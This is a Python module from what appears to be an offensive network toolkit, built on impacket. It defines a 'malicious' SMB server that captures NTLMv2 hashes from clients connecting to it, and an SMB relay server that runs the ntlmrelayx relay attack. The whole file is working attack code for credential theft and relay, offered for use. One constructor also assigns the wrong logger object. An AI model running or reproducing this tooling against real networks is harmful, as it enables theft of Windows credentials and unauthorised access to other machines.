from impacket.smbserver import SimpleSMBServer
import logging
from loguru import logger
from .interceptlogging import (
    InterceptHandlerStdoutNtlmRelay,
    InterceptHandlerOnlyFilesNtlmRelay,
    InterceptHandlerStdoutMss,
    InterceptHandlerOnlyFilesMss,
)

from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
import cmd2


class MaliciousSmbServer:
    """[ Class that contains the configuration for the smbserver ]

    Args:
        lhost (str): [ ip of the host that will start the smb server ]
        port (str): [ port for the smb server ]
        info_logger (logger): [  logger to show information on the screen  ]
        ntlmv2_collected: (dict,optional): [ All ntlm hashes will be saved here ]. Default to None
        asynchronous (bool,optional): [  Attribute to now if the attack will be performed asynchronously  ]. Default to None
        path_file (str,optional): [ Path to the output file ]. Default to None
        alerts_dictionary (dict,optional): [  Attribute that contains the dictionary that manages alerts ]. Default to None
    """

    def __init__(
        self,
        lhost: str,
        port: str,
        info_logger:logger,
        ntlmv2_collected: dict = None,
        asynchronous: bool = None,
        path_file: str = None,
        alerts_dictionary: dict = None,
    ) -> None:
        self.__lhost = lhost
        self.__port = port
        self.__info_logger = info_logger
        self.__asynchronous = asynchronous
        self.__alerts_dictionary = alerts_dictionary
        self.__path_file = path_file
        self.__ntlmv2_collected = ntlmv2_collected

    @property
    def lhost(self) -> str:
        return self.__lhost

    @property
    def port(self) -> str:
        return self.__port

    @port.setter
    def port(self, port: str) -> None:
        self.__port = port

    @lhost.setter
    def lhost(self, lhost: str) -> None:
        self.__lhost = lhost

    def start_malicious_smbserver(self) -> None:
        """[ Function to start the malicious smb server ]"""
        self.__info_logger.info("Starting Malicious SMB Server ...")
        if self.__asynchronous:
            logging.basicConfig(
                handlers=[
                    InterceptHandlerOnlyFilesMss(
                        self.__alerts_dictionary,
                        self.__path_file,
                        self.__ntlmv2_collected
                    )
                ],
                level=0,
            )
        else:
            logging.basicConfig(
                handlers=[InterceptHandlerStdoutMss(self.__path_file, self.__ntlmv2_collected)], level=0
            )
        try:
            server = SimpleSMBServer(self.__lhost, int(self.__port))
            server.setSMBChallenge("")
            server.start()
        except OSError:
            self.__info_logger.error("Address already in use. Is ntlm_relay running ? ")


class SmbRelayServer:
    """[ Class to configure the smb relay server ]
    Args:
        config (NLTMRelayxConfig) : [ Configuration for the ntlm relay attack ]
        info_logger (logger): [ logger to show information on the screen ]
        asynchronous (bool,optional): [ Attribute to now if the attack will be performed asynchronously ]. Default to None
        alerts_dictionary (dict,optional): [ Attribute that contains the dictionary that manages alerts ]. Default to None
    """
    def __init__(
        self,
        config: NTLMRelayxConfig,
        info_logger: logger,
        asynchronous: bool = None,
        alerts_dictionary: dict = None,
    ) -> None:
        self.__info_logger = logger
        self.__asynchronous = asynchronous
        self.__config = config
        self.__alerts_dictionary = alerts_dictionary

    @property
    def asynchronous(self) -> bool:
        return self.__asynchronous

    def start_smb_relay_server(self) -> None:
        """[ Method to configure the smb server based on the configurations proposed by the user ]"""
        if self.__asynchronous:
            logging.basicConfig(
                handlers=[InterceptHandlerOnlyFilesNtlmRelay(self.__alerts_dictionary)],
                level=0,
            )
            self.__info_logger.info("Starting smb-relay server...")
        else:
            logging.basicConfig(handlers=[InterceptHandlerStdoutNtlmRelay()], level=0)
            self.__info_logger.info("Starting smb-relay server...")
        try:
            server = SMBRelayServer(self.__config)
            server.daemon = True
            server.start()
            server.join()
        except OSError:
            self.__info_logger.error("Address already in use. Is mss running ? ")
